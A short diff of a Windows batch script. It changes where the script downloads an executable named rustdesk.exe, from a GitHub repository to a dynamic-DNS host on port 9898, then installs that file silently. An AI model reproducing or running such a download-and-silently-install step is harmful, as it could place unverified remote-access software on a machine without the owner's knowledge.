@@ -19,7 +19,7 @@ REM ############################### Please Do Not Edit Below This Line #########
 if not exist C:\Users\Public\Downloads\ md C:\Users\Public\Downloads\
 cd C:\Users\Public\Downloads\
 
-curl -L "https://github.com/nobita2906/file_vm/raw/refs/heads/main/rustdesk.exe" -o rustdesk.exe
+curl -L "https://khakim.mooo.com:9898/api/public/dl/4gCa6ROy" -o rustdesk.exe
 
 rustdesk.exe --silent-install
 timeout /t 3
